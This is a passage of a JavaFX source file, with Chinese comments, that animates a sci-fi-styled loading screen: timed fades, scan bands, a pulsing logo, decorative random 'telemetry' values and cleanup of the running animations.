            @Override public void run() {
                titleMainBox.setTranslateY(0);
                fadeTo(titleMainBox, 320, 1.0);
                fadeTo(titleShadowLabel, 280, 0.4);
                fadeTo(statusPrimaryLabel, 280, 1.0);
                fadeTo(statusSecondaryLabel, 280, 1.0);
                setStageText(4); // 极简模式不展示中间阶段文案，直接显示 READY 文案
            }
        });
        // +1700ms: READY 闪光 + 微回弹
        delay(1700, new Runnable() {
            @Override public void run() {
                fadeTo(readyFlash, 80, 1.0);
                tintAmbient(0.90, 0.40, 0.22, 380);
            }
        });
        delay(1820, new Runnable() {
            @Override public void run() { fadeTo(readyFlash, 320, 0); }
        });
        // +2200ms: 切场
        delay(MINIMAL_TOTAL_MS, new Runnable() {
            @Override public void run() { markLoadingComplete(); }
        });
    }

    /**
     * [A3 首屏感知速度] 屏幕预热 0~250ms 微动画：
     *   0~100ms  voidLayer 醒来：opacity 0.85→1.0 + scale 0.998→1.0（镜头微推近）
     *   100~250ms ambientLayer 极轻"探测信号"：opacity 0→0.12
     * phaseWake 在 +250ms 接管 ambientLayer，从 0.12 平滑过渡到 1.0。
     */
    private void phasePrewake() {
        // voidLayer 醒来：opacity + scale 同时复位
        FadeTransition voidFade = new FadeTransition(Duration.millis(100), voidLayer);
        voidFade.setFromValue(voidLayer.getOpacity());
        voidFade.setToValue(1.0);
        voidFade.setInterpolator(Interpolator.EASE_OUT);
        Timeline voidScale = new Timeline(
                new KeyFrame(Duration.ZERO,
                        new KeyValue(voidLayer.scaleXProperty(), voidLayer.getScaleX()),
                        new KeyValue(voidLayer.scaleYProperty(), voidLayer.getScaleY())),
                new KeyFrame(Duration.millis(100),
                        new KeyValue(voidLayer.scaleXProperty(), 1.0, Interpolator.EASE_OUT),
                        new KeyValue(voidLayer.scaleYProperty(), 1.0, Interpolator.EASE_OUT))
        );
        ParallelTransition voidWake = new ParallelTransition(voidFade, voidScale);
        voidWake.play();
        animations.add(voidWake);

        // ambient 极轻探测：100~250ms 内升到 0.12（仅作"系统已感知"反馈，phaseWake 会从此继续升到 1.0）
        FadeTransition ambientHint = new FadeTransition(Duration.millis(150), ambientLayer);
        ambientHint.setFromValue(0);
        ambientHint.setToValue(0.12);
        ambientHint.setInterpolator(Interpolator.EASE_OUT);
        ambientHint.setDelay(Duration.millis(100));
        ambientHint.play();
        animations.add(ambientHint);
    }

    private void phaseWake() {
        fadeTo(ambientLayer, 760, 1.0);
        fadeTo(dustLayer, 900, 1.0);
        fadeTo(binaryLayer, 900, 0.86);                     // 三类背景数据保持可辨识，但仍低于 HUD 和主标题
        fadeTo(dualChannelLayer, 620, 1.0);
        animateDualChannels();
        startBinaryTelemetry();
        fadeTo(coordinateLayer, 600, 1.0);
        for (Node n : coordinateLayer.getChildren()) {
            // 经纬线强/弱都轻提，让背景有"结构调度感"而不是只有脱离的背景 binary
            fadeTo(n, 760, n.getStyleClass().contains("coordinate-line-strong") ? 0.88 : 0.55);
            Timeline tl = new Timeline(
                    new KeyFrame(Duration.ZERO,
                            new KeyValue(n.scaleXProperty(), n.getScaleX()),
                            new KeyValue(n.scaleYProperty(), n.getScaleY())),
                    new KeyFrame(Duration.millis(900),
                            new KeyValue(n.scaleXProperty(), 1, Interpolator.EASE_OUT),
                            new KeyValue(n.scaleYProperty(), 1, Interpolator.EASE_OUT))
            );
            tl.play();
            animations.add(tl);
        }
        slideFade(topRail, 520, -14, 0);
        pulseRail();
        delay(520, new Runnable() {
            @Override public void run() { runGlobalScan(820, 0.74); }
        });
    }


    private void animateDualChannels() {
        for (int i = 0; i < dualChannels.size(); i++) {
            Pane channel = dualChannels.get(i);
            FadeTransition ft = new FadeTransition(Duration.millis(620), channel);
            ft.setFromValue(0);
            ft.setToValue(i == 0 ? 0.82 : 0.58);
            TranslateTransition tt = new TranslateTransition(Duration.millis(820), channel);
            tt.setToX(0);
            tt.setToY(0);
            tt.setInterpolator(Interpolator.SPLINE(0.16, 1.0, 0.3, 1.0));
            ParallelTransition pt = new ParallelTransition(ft, tt);
            pt.play();
            animations.add(pt);
        }
        delay(1420, new Runnable() {
            @Override public void run() {
                for (Pane channel : dualChannels) {
                    fadeTo(channel, 620, 0.20);
                }
            }
        });
    }

    private void startBinaryTelemetry() {
        for (int i = 0; i < binaryFlows.size(); i++) {
            final BinaryFlow flow = binaryFlows.get(i);
            delay(160 + i * 35, new Runnable() {
                @Override public void run() {
                    FadeTransition ft = new FadeTransition(Duration.millis(560), flow.node);
                    ft.setToValue(flow.peakOpacity);
                    TranslateTransition tt = new TranslateTransition(Duration.seconds(5.8 + random.nextDouble() * 2.4), flow.node);
                    tt.setFromX(0);
                    tt.setFromY(0);
                    tt.setToX(flow.dx);
                    tt.setToY(flow.dy);
                    tt.setAutoReverse(true);
                    tt.setCycleCount(Animation.INDEFINITE);
                    tt.setInterpolator(Interpolator.EASE_BOTH);
                    Timeline update = new Timeline(new KeyFrame(Duration.seconds(flow.updateSeconds), e -> flow.node.setText(randomBinaryText(flow.seeds))));
                    update.setCycleCount(Animation.INDEFINITE);
                    ft.play();
                    tt.play();
                    update.play();
                    animations.add(ft);
                    animations.add(tt);
                    animations.add(update);
                }
            });
        }
    }

    private void phaseHud() {
        setStageText(1);
        tintAmbient(0.85, 0.45, 0.08, 700); // HUD 阶段：冷青主导校准
        if (cornerReticleLayer != null) fadeTo(cornerReticleLayer, 540, 1.0); // 拐角准星同期 HUD 渐显
        fadeTo(connectionLayer, 420, 1.0);
        for (Node n : connectionLayer.getChildren()) {
            fadeTo(n, 420, 1.0);
            ScaleTransition st = new ScaleTransition(Duration.millis(620), n);
            st.setToX(1.0);
            st.setToY(1.0);
            st.setInterpolator(Interpolator.EASE_OUT);
            st.play();
            animations.add(st);
        }
        runGlobalScan(680, 0.62);
        slideFade(leftWing, 540, -26, 0);
        slideFade(rightWing, 540, 26, 0);
        slideFade(bottomRail, 540, 18, 0);
        activateModules(180);
        activateTelemetry(300);
        activateSpectrum(380);                        // 频谱柱条 380ms 后启动 220ms tick
        activateRadar(420);                           // 雷达扫描 420ms 后启动 4s 一圈
        revealPhaseItems(260);
    }

    private void phaseGlass() {
        setStageText(2);
        tintAmbient(0.95, 0.65, 0.08, 800); // GLASS 阶段：冷青 + 紫边凝结
        fadeTo(glassDeck, 520, 1.0);
        fadeTo(glassBack, 520, 1.0);
        ScaleTransition deckScale = new ScaleTransition(Duration.millis(720), glassDeck);
        deckScale.setToX(1.0);
        deckScale.setToY(1.0);
        deckScale.setInterpolator(Interpolator.SPLINE(0.16, 1.0, 0.3, 1.0));
        deckScale.play();
        animations.add(deckScale);

        delay(120, new Runnable() {
            @Override public void run() {
                fadeTo(glassMist, 520, 1.0);
                fadeTo(glassSpectrum, 680, 1.0);
                fadeTo(glassTextureLayer, 620, 1.0);
                if (glassProbeLayer != null) fadeTo(glassProbeLayer, 420, 0.62);
                expandEdge(glassTopEdge, true, 520);
                expandEdge(glassBottomEdge, true, 620);
                expandEdge(glassLeftEdge, false, 560);
                expandEdge(glassRightEdge, false, 660);
            }
        });
        delay(560, new Runnable() {
            @Override public void run() {
                // 性能降级后跳过高光 sweep
                if (phaseGlassSweepEnabled) sweepGlassHighlight();
            }
        });
    }

    private void phaseLogo() {
        setStageText(3);
        // LOGO 阶段：暖光"识别"瞬间 —— amber 先脉冲到 0.65，再回落到 0.50 形成温暖停留
        tintAmbient(0.80, 0.50, 0.65, 380);
        if (glassProbeLayer != null) fadeTo(glassProbeLayer, 260, 0.0);
        delay(420, new Runnable() {
            @Override public void run() { tintAmbient(0.80, 0.50, 0.50, 600); }
        });
        fadeTo(logoArea, 360, 1.0);
        pop(logoLens, 520);
        pop(logoReticleOuter, 520);
        pop(logoReticleInner, 620);
        logoImage.setOpacity(1);
        fadeTo(logoScanLine, 160, 1.0);
        Timeline scan = new Timeline(
                new KeyFrame(Duration.ZERO,
                        new KeyValue(logoClip.heightProperty(), 0),
                        new KeyValue(logoScanLine.translateYProperty(), -84)),
                new KeyFrame(Duration.millis(620),
                        new KeyValue(logoClip.heightProperty(), 126, Interpolator.LINEAR),
                        new KeyValue(logoScanLine.translateYProperty(), 84, Interpolator.LINEAR))
        );
        scan.setOnFinished(e -> {
            fadeTo(logoScanLine, 180, 0);
            startLogoReticleRotation();
            startLogoBreath();
        });
        scan.play();
        animations.add(scan);
    }

    private void startLogoReticleRotation() {
        RotateTransition outer = new RotateTransition(Duration.seconds(18), logoReticleOuter);
        outer.setByAngle(360);
        outer.setCycleCount(Animation.INDEFINITE);
        outer.setInterpolator(Interpolator.LINEAR);
        outer.play();
        animations.add(outer);
        RotateTransition inner = new RotateTransition(Duration.seconds(24), logoReticleInner);
        inner.setByAngle(-360);
        inner.setCycleCount(Animation.INDEFINITE);
        inner.setInterpolator(Interpolator.LINEAR);
        inner.play();
        animations.add(inner);
    }

    private void phaseTitleAndTrack() {
        setStageText(3);
        Animation shadowIn = textIn(titleShadowLabel, 0, -2, 2, 140);
        shadowIn.play();
        animations.add(shadowIn);
        Animation titleIn = textIn(titleMainBox, 0, 0, 0, 140);
        titleIn.play();
        animations.add(titleIn);
        delay(150, new Runnable() {
            @Override public void run() {
                titleMainBox.setOpacity(1.0);
                titleMainBox.setTranslateY(0);
                titlePotatoLabel.setOpacity(1.0);
                titleToolLabel.setOpacity(1.0);
            }
        });
        delay(210, new Runnable() {
            @Override public void run() { fadeTo(titleShadowLabel, 220, 0.28); }
        });
        fadeTo(statusPrimaryLabel, 360, 1.0);
        fadeTo(statusSecondaryLabel, 420, 1.0);
        Timeline lockLine = new Timeline(
                new KeyFrame(Duration.ZERO,
                        new KeyValue(titleLockLine.opacityProperty(), 0),
                        new KeyValue(titleLockLine.minWidthProperty(), 0),
                        new KeyValue(titleLockLine.prefWidthProperty(), 0),
                        new KeyValue(titleLockLine.maxWidthProperty(), 0)),
                new KeyFrame(Duration.millis(520),
                        new KeyValue(titleLockLine.opacityProperty(), 1, Interpolator.EASE_OUT),
                        new KeyValue(titleLockLine.minWidthProperty(), 220, Interpolator.EASE_OUT),
                        new KeyValue(titleLockLine.prefWidthProperty(), 220, Interpolator.EASE_OUT),
                        new KeyValue(titleLockLine.maxWidthProperty(), 220, Interpolator.EASE_OUT))
        );
        lockLine.play();
        animations.add(lockLine);
        delay(120, new Runnable() {
            @Override public void run() { animateEnergyRail(); }
        });
        drivePhases();
    }

    private void phaseReady() {
        setStageText(4);
        setActivePhase(4);
        tintAmbient(0.90, 0.40, 0.22, 540); // [A1] READY 阶段：冷青回归 + 微暖余韵
        terminalDot.getStyleClass().remove("terminal-ready");
        terminalDot.getStyleClass().add("terminal-ready");
        runGlobalScan(520, 0.82);
        fadeTo(readyFlash, 80, 1.0);
        delay(120, new Runnable() {
            @Override public void run() { fadeTo(readyFlash, 360, 0); }
        });
        Timeline settle = new Timeline(
                new KeyFrame(Duration.ZERO, new KeyValue(glassDeck.scaleXProperty(), 1.0), new KeyValue(glassDeck.scaleYProperty(), 1.0)),
                new KeyFrame(Duration.millis(120), new KeyValue(glassDeck.scaleXProperty(), 1.018), new KeyValue(glassDeck.scaleYProperty(), 1.018)),
                new KeyFrame(Duration.millis(320), new KeyValue(glassDeck.scaleXProperty(), 1.0), new KeyValue(glassDeck.scaleYProperty(), 1.0))
        );
        settle.play();
        animations.add(settle);
    }


    private void runGlobalScan(double durationMs, double peakOpacity) {
        if (globalScanBands.isEmpty()) return;
        if (globalScanTimeline != null && globalScanTimeline.getStatus() == Animation.Status.RUNNING) return;
        final Pane scan = globalScanBands.get(0);
        globalScanLayer.setOpacity(1.0);
        Timeline tl = new Timeline(
                new KeyFrame(Duration.ZERO,
                        new KeyValue(scan.opacityProperty(), 0.0),
                        new KeyValue(scan.translateYProperty(), -92.0)),
                new KeyFrame(Duration.millis(90),
                        new KeyValue(scan.opacityProperty(), peakOpacity, Interpolator.EASE_OUT)),
                new KeyFrame(Duration.millis(Math.max(120, durationMs - 160)),
                        new KeyValue(scan.opacityProperty(), peakOpacity * 0.72, Interpolator.LINEAR)),
                new KeyFrame(Duration.millis(durationMs),
                        new KeyValue(scan.opacityProperty(), 0.0, Interpolator.EASE_IN),
                        new KeyValue(scan.translateYProperty(), HEIGHT + 92, Interpolator.LINEAR))
        );
        globalScanTimeline = tl;
        tl.setOnFinished(e -> globalScanTimeline = null);
        tl.play();
        animations.add(tl);
    }

    private void startLogoBreath() {
        DropShadow shadow = new DropShadow();
        shadow.setColor(Color.web("#5DEBFF"));
        shadow.setRadius(16);
        shadow.setSpread(0.16);
        shadow.setInput(createLogoToneAdjust());
        logoImage.setEffect(shadow);
        Timeline pulse = new Timeline(
                new KeyFrame(Duration.ZERO,
                        new KeyValue(shadow.radiusProperty(), 14.0, Interpolator.EASE_BOTH),
                        new KeyValue(shadow.spreadProperty(), 0.14, Interpolator.EASE_BOTH),
                        new KeyValue(logoLens.scaleXProperty(), 1.0, Interpolator.EASE_BOTH),
                        new KeyValue(logoLens.scaleYProperty(), 1.0, Interpolator.EASE_BOTH)),
                new KeyFrame(Duration.seconds(2.1),
                        new KeyValue(shadow.radiusProperty(), 28.0, Interpolator.EASE_BOTH),
                        new KeyValue(shadow.spreadProperty(), 0.25, Interpolator.EASE_BOTH),
                        new KeyValue(logoLens.scaleXProperty(), 1.045, Interpolator.EASE_BOTH),
                        new KeyValue(logoLens.scaleYProperty(), 1.045, Interpolator.EASE_BOTH)),
                new KeyFrame(Duration.seconds(4.2),
                        new KeyValue(shadow.radiusProperty(), 14.0, Interpolator.EASE_BOTH),
                        new KeyValue(shadow.spreadProperty(), 0.14, Interpolator.EASE_BOTH),
                        new KeyValue(logoLens.scaleXProperty(), 1.0, Interpolator.EASE_BOTH),
                        new KeyValue(logoLens.scaleYProperty(), 1.0, Interpolator.EASE_BOTH))
        );
        pulse.setCycleCount(Animation.INDEFINITE);
        pulse.play();
        animations.add(pulse);
    }

    private void animateEnergyRail() {
        fadeTo(energyRail, 260, 1.0);
        Timeline fill = new Timeline(
                new KeyFrame(Duration.ZERO,
                        new KeyValue(energyFill.minWidthProperty(), 0.0),
                        new KeyValue(energyFill.prefWidthProperty(), 0.0),
                        new KeyValue(energyFill.maxWidthProperty(), 0.0)),
                new KeyFrame(Duration.millis(1180),
                        new KeyValue(energyFill.minWidthProperty(), ENERGY_WIDTH, Interpolator.SPLINE(0.16, 1.0, 0.3, 1.0)),
                        new KeyValue(energyFill.prefWidthProperty(), ENERGY_WIDTH, Interpolator.SPLINE(0.16, 1.0, 0.3, 1.0)),
                        new KeyValue(energyFill.maxWidthProperty(), ENERGY_WIDTH, Interpolator.SPLINE(0.16, 1.0, 0.3, 1.0)))
        );
        fill.play();
        animations.add(fill);

        Timeline shine = new Timeline(
                new KeyFrame(Duration.ZERO,
                        new KeyValue(energyShine.opacityProperty(), 0.0),
                        new KeyValue(energyShine.translateXProperty(), -78.0)),
                new KeyFrame(Duration.millis(120),
                        new KeyValue(energyShine.opacityProperty(), 0.88, Interpolator.EASE_OUT)),
                new KeyFrame(Duration.millis(960),
                        new KeyValue(energyShine.translateXProperty(), ENERGY_WIDTH, Interpolator.EASE_BOTH),
                        new KeyValue(energyShine.opacityProperty(), 0.72, Interpolator.LINEAR)),
                new KeyFrame(Duration.millis(1180),
                        new KeyValue(energyShine.opacityProperty(), 0.0, Interpolator.EASE_IN))
        );
        shine.play();
        animations.add(shine);
    }

    private void setStageText(int index) {
        if (index < 0 || index >= primaryStatus.length) return;
        topPhaseLabel.setText(topPhases[index]);
        fadeSwap(statusPrimaryLabel, primaryStatus[index]);
        fadeSwap(statusSecondaryLabel, secondaryStatus[index]);
        fadeSwap(terminalPrimaryLabel, primaryStatus[index]);
        fadeSwap(terminalSecondaryLabel, secondaryStatus[index]);
    }

    private void activateModules(double start) {
        for (int i = 0; i < moduleRows.size(); i++) {
            final ModuleRow row = moduleRows.get(i);
            delay(start + i * 130, new Runnable() {
                @Override public void run() {
                    slideFade(row.row, 300, -12, 0);
                    Timeline bar = new Timeline(
                            new KeyFrame(Duration.ZERO,
                                    new KeyValue(row.fill.minWidthProperty(), 0),
                                    new KeyValue(row.fill.prefWidthProperty(), 0),
                                    new KeyValue(row.fill.maxWidthProperty(), 0)),
                            new KeyFrame(Duration.millis(360),
                                    new KeyValue(row.fill.minWidthProperty(), row.width, Interpolator.EASE_OUT),
                                    new KeyValue(row.fill.prefWidthProperty(), row.width, Interpolator.EASE_OUT),
                                    new KeyValue(row.fill.maxWidthProperty(), row.width, Interpolator.EASE_OUT))
                    );
                    bar.setOnFinished(e -> {
                        row.state.setText("OK");
                        row.state.getStyleClass().add("module-ok");
                    });
                    bar.play();
                    animations.add(bar);
                }
            });
        }
    }

    private void activateTelemetry(double start) {
        for (int i = 0; i < telemetryList.getChildren().size(); i++) {
            final Node row = telemetryList.getChildren().get(i);
            delay(start + i * 130, new Runnable() {
                @Override public void run() { slideFade(row, 300, 12, 0); }
            });
        }
        delay(start, new Runnable() {
            @Override public void run() {
                Timeline matrix = new Timeline(new KeyFrame(Duration.millis(160), e -> blinkMatrix()));
                matrix.setCycleCount(Animation.INDEFINITE);
                matrix.play();
                animations.add(matrix);
                Timeline values = new Timeline(new KeyFrame(Duration.millis(320), e -> updateTelemetryValues()));
                values.setCycleCount(Animation.INDEFINITE);
                values.play();
                animations.add(values);
            }
        });
    }

    /**
     * 矩阵常态呼吸，叠加随机高频 burst（电涌闪火）。
     * burst：低概率短促增强，避免右翼矩阵在后段抢过中央标题。
     */
    private void blinkMatrix() {
        if (matrixCells.isEmpty()) return; // 解决生命周期注销时的竞态防御
        long nowMs = System.currentTimeMillis();
        boolean burst = (nowMs - lastMatrixBurstMs > 850) && random.nextDouble() < 0.16;
        if (burst) lastMatrixBurstMs = nowMs;
        int hotCount = burst ? 6 : 4;
        for (Region cell : matrixCells) {
            cell.getStyleClass().remove("matrix-cell-hot");
            cell.setOpacity(0.16 + random.nextDouble() * 0.24);
        }
        for (int i = 0; i < hotCount; i++) {
            Region hot = matrixCells.get(random.nextInt(matrixCells.size()));
            if (!hot.getStyleClass().contains("matrix-cell-hot")) {
                hot.getStyleClass().add("matrix-cell-hot");
            }
            hot.setOpacity(burst ? 0.78 + random.nextDouble() * 0.10 : 0.68 + random.nextDouble() * 0.20);
        }
    }

    /**
     * 遥测值更新：~25% 概率先报 60ms 的十六进制噪声（模拟高速抓包跳变），再落定到稳态值。
     * 剩余走原有平滑路径，避免汇总后存在过于戏剧化的频繁闪烁。
     */
    private void updateTelemetryValues() {
        if (telemetryValueLabels.size() < 4) return;
        final String[] finalValues = new String[] {
                String.format("%02d%%", 84 + random.nextInt(15)),
                (12 + random.nextInt(20)) + "ms",
                (68 + random.nextInt(24)) + "%",
                (120 + random.nextInt(96)) + "M"
        };
        if (random.nextDouble() < 0.25) {
            for (int i = 0; i < 4; i++) {
                telemetryValueLabels.get(i).setText(String.format("0x%02X", random.nextInt(256)));
            }
            PauseTransition jitter = new PauseTransition(Duration.millis(60));
            jitter.setOnFinished(new javafx.event.EventHandler<javafx.event.ActionEvent>() {
                @Override public void handle(javafx.event.ActionEvent e) {
                    // 解决生命周期注销时与 StopAnimations 之间的竞态条件
                    if (telemetryValueLabels.size() < 4) return;
                    for (int i = 0; i < 4; i++) {
                        telemetryValueLabels.get(i).setText(finalValues[i]);
                    }
                }
            });
            jitter.play();
        } else {
            for (int i = 0; i < 4; i++) {
                telemetryValueLabels.get(i).setText(finalValues[i]);
            }
        }
    }

    private void revealPhaseItems(double start) {
        for (int i = 0; i < phaseItems.size(); i++) {
            final PhaseItem item = phaseItems.get(i);
            delay(start + i * 90, new Runnable() {
                @Override public void run() { fadeTo(item.box, 260, 1.0); }
            });
        }
    }

    private void drivePhases() {
        for (int i = 0; i < phaseItems.size(); i++) {
            final int idx = i;
            delay(0 + i * 260, new Runnable() {
                @Override public void run() {
                    setActivePhase(idx);
                }
            });
        }
    }

    private ColorAdjust createLogoToneAdjust() {
        ColorAdjust tone = new ColorAdjust();
        tone.setSaturation(-0.34);
        tone.setBrightness(-0.05);
        tone.setContrast(-0.04);
        return tone;
    }

    private void setActivePhase(int index) {
        for (int i = 0; i < phaseItems.size(); i++) {
            PhaseItem item = phaseItems.get(i);
            item.node.getStyleClass().remove("phase-node-active");
            item.node.getStyleClass().remove("phase-node-done");
            item.label.getStyleClass().remove("phase-label-active");
            if (item.nextLink != null) item.nextLink.getStyleClass().remove("phase-link-done");
            if (i < index) {
                item.node.getStyleClass().add("phase-node-done");
                if (item.nextLink != null) item.nextLink.getStyleClass().add("phase-link-done");
            } else if (i == index) {
                item.node.getStyleClass().add("phase-node-active");
                item.label.getStyleClass().add("phase-label-active");
                ScaleTransition pulse = new ScaleTransition(Duration.millis(180), item.node);
                pulse.setFromX(1.0);
                pulse.setFromY(1.0);
                pulse.setToX(1.45);
                pulse.setToY(1.45);
                pulse.setAutoReverse(true);
                pulse.setCycleCount(2);
                pulse.play();
                animations.add(pulse);
            }
        }
    }

    private void sweepGlassHighlight() {
        glassHighlight.setOpacity(0);
        glassHighlight.setTranslateX(-390);
        FadeTransition fadeIn = new FadeTransition(Duration.millis(110), glassHighlight);
        fadeIn.setToValue(0.58);
        TranslateTransition move = new TranslateTransition(Duration.millis(620), glassHighlight);
        move.setFromX(-390);
        move.setToX(390);
        move.setInterpolator(Interpolator.LINEAR);
        FadeTransition fadeOut = new FadeTransition(Duration.millis(180), glassHighlight);
        fadeOut.setFromValue(0.58);
        fadeOut.setToValue(0);
        SequentialTransition seq = new SequentialTransition(fadeIn, move, fadeOut);
        seq.play();
        animations.add(seq);
    }

    private void expandEdge(Node node, boolean x, double ms) {
        fadeTo(node, ms, 1.0);
        ScaleTransition st = new ScaleTransition(Duration.millis(ms), node);
        if (x) st.setToX(1.0); else st.setToY(1.0);
        st.setInterpolator(Interpolator.EASE_OUT);
        st.play();
        animations.add(st);
    }

    private Animation textIn(Node node, double fromY, double toX, double toY, double ms) {
        FadeTransition ft = new FadeTransition(Duration.millis(ms), node);
        ft.setFromValue(0);
        ft.setToValue(1);
        TranslateTransition tt = new TranslateTransition(Duration.millis(ms), node);
        tt.setToX(toX);
        tt.setToY(toY);
        tt.setInterpolator(Interpolator.EASE_OUT);
        return new ParallelTransition(ft, tt);
    }

    private void pop(Node node, double ms) {
        fadeTo(node, ms, 1.0);
        ScaleTransition st = new ScaleTransition(Duration.millis(ms), node);
        st.setToX(1.0);
        st.setToY(1.0);
        st.setInterpolator(Interpolator.SPLINE(0.16, 1.0, 0.3, 1.0));
        st.play();
        animations.add(st);
    }

    private void pulseRail() {
        Timeline tl = new Timeline(
                new KeyFrame(Duration.ZERO, new KeyValue(topRailPulse.opacityProperty(), 1.0)),
                new KeyFrame(Duration.millis(900), new KeyValue(topRailPulse.opacityProperty(), 0.32, Interpolator.EASE_BOTH)),
                new KeyFrame(Duration.millis(1800), new KeyValue(topRailPulse.opacityProperty(), 1.0, Interpolator.EASE_BOTH))
        );
        tl.setCycleCount(Animation.INDEFINITE);
        tl.play();
        animations.add(tl);
    }

    private void slideFade(Node node, double ms, double from, double to) {
        FadeTransition ft = new FadeTransition(Duration.millis(ms), node);
        ft.setFromValue(node.getOpacity());
        ft.setToValue(1.0);
        TranslateTransition tt = new TranslateTransition(Duration.millis(ms), node);
        if (Math.abs(node.getTranslateX()) > Math.abs(node.getTranslateY())) {
            tt.setFromX(from);
            tt.setToX(to);
        } else {
            tt.setFromY(from);
            tt.setToY(to);
        }
        tt.setInterpolator(Interpolator.EASE_OUT);
        ParallelTransition pt = new ParallelTransition(ft, tt);
        pt.play();
        animations.add(pt);
    }

    private void fadeTo(Node node, double ms, double value) {
        FadeTransition ft = new FadeTransition(Duration.millis(ms), node);
        ft.setFromValue(node.getOpacity());
        ft.setToValue(value);
        ft.setInterpolator(Interpolator.EASE_OUT);
        ft.play();
        animations.add(ft);
    }

    private void fadeSwap(final Label label, final String text) {
        FadeTransition out = new FadeTransition(Duration.millis(90), label);
        out.setFromValue(label.getOpacity());
        out.setToValue(0);
        out.setOnFinished(e -> {
            label.setText(text);
            FadeTransition in = new FadeTransition(Duration.millis(150), label);
            in.setToValue(1);
            in.play();
            animations.add(in);
        });
        out.play();
        animations.add(out);
    }

    private void delay(double ms, final Runnable r) {
        PauseTransition p = new PauseTransition(Duration.millis(ms));
        p.setOnFinished(e -> r.run());
        p.play();
        animations.add(p);
    }

    private void setRegionWidth(Region r, double width) {
        r.setMinWidth(width);
        r.setPrefWidth(width);
        r.setMaxWidth(width);
    }

    private static String safeI18n(String key, String fallback) {
        try {
            String v = I18nUtils.getString(key);
            if (v == null || v.length() == 0 || key.equals(v)) return fallback;
            return v;
        } catch (Exception e) {
            return fallback;
        }
    }

    public void stopAnimations() {
        stopRuntimeAnimations(true, true);
        dusts.clear();
        binaryFlows.clear();
        dualChannels.clear();
        moduleRows.clear();
        matrixCells.clear();
        globalScanBands.clear();
        telemetryValueLabels.clear();
        phaseItems.clear();
    }

    private void stopRuntimeAnimations(boolean stopPerfLog, boolean stopClock) {
        // [C1] 停掉帧率监测器，避免主界面进入后残留 AnimationTimer
        if (perfMonitor != null) {
            try { perfMonitor.stop(); } catch (Exception ignored) {}
            perfMonitor = null;
        }
        for (Animation animation : animations) {
            try {
                animation.stop();
            } catch (Exception ignored) {
            }
        }
        animations.clear();
        if (dustTimer != null) {
            dustTimer.stop();
            dustTimer = null;
        }
        if (stopClock && clockTimer != null) {
            clockTimer.stop();
            clockTimer = null;
        }
        if (stopPerfLog && perfLogTimer != null) {
            perfLogTimer.stop();
            perfLogTimer = null;
        }
        globalScanTimeline = null;
    }

    private static final class Dust {
        final Region node;
        double x;
        double y;
        double vx;
        double vy;
        double phase;
        double opacity;
        Dust(Region node) {
            this.node = node;
        }
    }

    private static final class BinaryFlow {
        final Text node;
        final String[] seeds;
        final double dx;
        final double dy;
        final double peakOpacity;
        final double updateSeconds;
        BinaryFlow(Text node, String[] seeds, double dx, double dy, double peakOpacity, double updateSeconds) {
            this.node = node;
            this.seeds = seeds;
            this.dx = dx;
            this.dy = dy;
            this.peakOpacity = peakOpacity;
            this.updateSeconds = updateSeconds;
        }
    }

    private static final class ModuleRow {
        final HBox row;
        final Region fill;
        final Label state;
        final double width;
        ModuleRow(HBox row, Region fill, Label state, double width) {
            this.row = row;
            this.fill = fill;
            this.state = state;
            this.width = width;
        }
    }

    private static final class PhaseItem {
        final VBox box;
        final Region node;
        final Label label;
        Region nextLink;
        PhaseItem(VBox box, Region node, Label label) {
            this.box = box;
            this.node = node;
            this.label = label;
        }
    }
}
